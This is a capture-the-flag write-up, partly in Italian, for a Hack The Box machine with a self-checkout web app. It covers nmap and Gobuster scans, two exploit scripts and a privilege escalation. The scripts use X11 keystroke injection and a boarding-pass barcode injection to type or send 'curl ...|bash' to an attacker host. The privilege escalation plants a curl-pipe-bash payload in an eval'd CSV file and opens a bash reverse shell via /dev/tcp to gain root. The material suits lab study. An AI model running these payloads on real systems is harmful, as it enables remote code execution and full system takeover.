---
## WriteUp_DotyBound (HTB) 
---
- [X]  **Discovered port and service with `nmap`**

<details>
<summary>🔵 nmap Result (click to expanded) </summary>

```lua

Nmap 7.991 scan initiated Sat Nov  7 17:30:57 2026 as: /usr/lib/nmap/nmap -sCV -p22,80,443 -oN target 10.129.199.122
Nmap scan report for 10.129.199.122
Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Nov  7 17:31:20 2026 -- 1 IP address (1 host up) scanned in 22.70 seconds

```

</details><br>

- [x] **Enumerazione web con `Gobuster`**

<details>

<summary> 🟡 Result Gobuster (Click to expand) </summary>

```lua

health               (Status: 200) [Size: 16]
browse               (Status: 200) [Size: 12721]
cart                 (Status: 200) [Size: 1065]
exit                 (Status: 405) [Size: 153]

```

</details>

### exploit Usati per il Foothold

<details>

<summary>⚠️ Exploit1 ⚠️ (Click to expand) </summary>

```python
#!/usr/bin/exnv python3
from Xlib import X, XK, display
from Xlib.ext import xtest
import time

d = display.Display(":0")
names = {" ": "space", ":": "colon", "/": "slash",
         ".": "period", "|": "bar"}

def tap(char):
    sym = XK.string_to_keysym(names.get(char, char))
    code = d.keysym_to_keycode(sym)
    if not code:
        raise ValueError(f"No keycode for {char!r}")
    shifted = d.keycode_to_keysym(code, 0) != sym
    shift = d.keysym_to_keycode(XK.string_to_keysym("Shift_L"))
    if shifted:
        xtest.fake_input(d, X.KeyPress, shift)
    xtest.fake_input(d, X.KeyPress, code)
    xtest.fake_input(d, X.KeyRelease, code)
    if shifted:
        xtest.fake_input(d, X.KeyRelease, shift)
    d.sync()
    time.sleep(0.03)

for char in "curl http://10.10.17.32:8000/run.sh|bash":
    tap(char)
tap("Return")

```

</details>

<details>

<summary> ⚠️Exploit 2⚠️ (Cick to expand) </summary>

```python
#!/usr/bin/env python3
import sys
import requests
import os


Target = "https://airsnacks.htb"

def boarding_pass(airline_use: str, origin: str = "LHR") -> str:
    fixed = (
        f"M1{'TEST/USER':<20}E{'ABC123':<7}"
        f"{origin:<3}{'JFK':<3}{'BA':<3}{'0123':<5}"
        f"298Y{'012A':<4}{'0001A':<5}1"
    )
    conditional = ">70B0WW6298BBA 03125" + airline_use
    assert len(fixed) == 58
    assert len(conditional) <= 255
    return fixed + f"{len(conditional):02X}" + conditional
if len(sys.argv) < 2:
    print(f"[i] Use: {sys.argv[0]} <command>")
    sys.exit(1)

else:
    session = requests.Session()
    session.verify = False
    requests.packages.urllib3.disable_warnings()
    session.post(Target + "/cart/add", json={"sku": "SNK-CRN"})
    response = session.post(
        Target + "/checkout/boarding-pass/verify",
        json={"raw": boarding_pass(sys.argv[1])},
    )
    print(response.status_code, response.text)

```

</details>

## Privilege Escalation

<details>

<summary> 🔴 Priv Escalation (Click to expands) </summary>

 enumeration dopo una ricera dei file con i permessi di scrittura notiamo che il file /opt/vrs/ data/duty-rates.csv risulta scrivibile.
: scriviamo un payload semplice all'interno di duty-rates.csv in modo che eval lo esegua
: mettiamo in ascolto il listener sulla porta 4446 della nostra macchina attaccante con `nc  -lvnp 4446`
:  e mettiamo in ascolto il nostro servizio sulla porta 8000 con `python3 -m http.server 8000`
: creiamo run.sh con dentro ==**bash -i &> /dev/tcp/10.10.X.X/4446 0>&1**==
: alla chiusura e salvataggio delle nove modifiche di `nano duty-rates.csv`
: Guardando il terminale del listener sulla porta 4446 digitiamo `whoami` e siamo root

</details>

<details>
    <summary>🔵root payload (Click to expand) </summary>

```php

SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
true;curl -s http://10.10.X.X:8000/run.sh|bash;#,1,1

```

</details>

**info contact: <salvo8253@live.it>**
